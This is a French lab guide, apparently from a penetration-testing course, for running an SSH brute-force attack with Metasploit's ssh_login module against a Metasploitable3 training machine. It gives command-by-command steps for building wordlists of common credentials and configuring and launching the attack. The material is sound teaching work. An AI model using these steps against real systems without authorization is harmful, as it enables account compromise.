## LAB6 - PARTIE2 - Configuration et Utilisation de Metasploit pour Attaque par Force Brute SSH

### Description
Ce document fournit des instructions détaillées pour utiliser Metasploit afin de lancer une attaque par force brute SSH contre une machine cible, en l'occurrence Metasploitable3. Ce guide couvre la préparation des fichiers nécessaires, la configuration de Metasploit, et le lancement de l'attaque.

### Prérequis
- **Système d'exploitation**: Linux (Ubuntu 22.04 préféré)
- **Metasploit Framework installé**
- **Accès administratif sur la machine où Metasploit est installé**
- **Machine cible configurée et accessible sur le réseau**

### Installation de Metasploit (si non installé)
1. Ouvrez un terminal.
2. Exécutez les commandes suivantes pour installer Metasploit:
   ```bash
   sudo apt update
   sudo apt install metasploit-framework
   ```

### Étape 1: Préparation des Fichiers de Noms d'Utilisateurs et de Mots de Passe
1. **Création des fichiers** :
   - Créez les fichiers contenant les noms d'utilisateurs et les mots de passe que vous prévoyez d'utiliser pour l'attaque.
     ```bash
     echo -e "root\nadmin\nuser\ntest\nguest\ninfo\noperator" > /home/eleve/usernames.txt
     echo -e "password\n123456\nadmin\nguest\n123123\npassword1\nqwerty\n12345\n123456789\ntest" > /home/eleve/passwords.txt
     ```

2. **Modification des permissions** :
   - Assurez-vous que les fichiers sont lisibles.
     ```bash
     chmod 644 /home/eleve/usernames.txt
     chmod 644 /home/eleve/passwords.txt
     ```

3. **Changement de propriétaire** :
   - Changez le propriétaire des fichiers pour garantir que Metasploit peut y accéder.
     ```bash
     sudo chown $(whoami) /home/eleve/usernames.txt
     sudo chown $(whoami) /home/eleve/passwords.txt
     ```

### Étape 2: Déplacement des Fichiers dans un Répertoire Accessible par Metasploit
- Déplacez les fichiers dans un répertoire où Metasploit a les permissions de lecture.
  ```bash
  sudo mv /home/eleve/usernames.txt /snap/metasploit-framework/
  sudo mv /home/eleve/passwords.txt /snap/metasploit-framework/
  ```

### Étape 3: Configuration de Metasploit
1. **Lancement de Metasploit** :
   - Ouvrez Metasploit en utilisant la commande suivante :
     ```bash
     msfconsole
     ```

2. **Configuration du module SSH** :
   - Configurez Metasploit pour utiliser les fichiers déplacés et ciblez la machine appropriée.
     ```bash
     use auxiliary/scanner/ssh/ssh_login
     set RHOSTS 172.28.128.3
     set USER_FILE /snap/metasploit-framework/usernames.txt
     set PASS_FILE /snap/metasploit-framework/passwords.txt
     set VERBOSE true
     ```

### Étape 4: Lancement de l'Attaque
- Exécutez le module pour commencer l'attaque.
  ```bash
  run
  ```

### Conseils de Sécurité
- **Permissions**: Vérifiez régulièrement que les permissions des fichiers sont correctement configurées pour éviter tout accès non autorisé.
- **Légalité**: Assurez-vous d'avoir l'autorisation explicite de tester la machine cible. L'utilisation de Metasploit sans consentement est illégale.

### Dépannage
- Si des problèmes surviennent, vérifiez les logs de Metasploit pour des détails sur les erreurs. Assurez-vous que les chemins des fichiers sont corrects et que les fichiers ne sont pas corrompus.

---

Ce document devrait vous fournir une base solide pour l'utilisation sécurisée et efficace de Metasploit dans vos tests de pénétration. Assurez-vous de suivre les meilleures pratiques de sécurité et de conformité légale lors de vos tests.
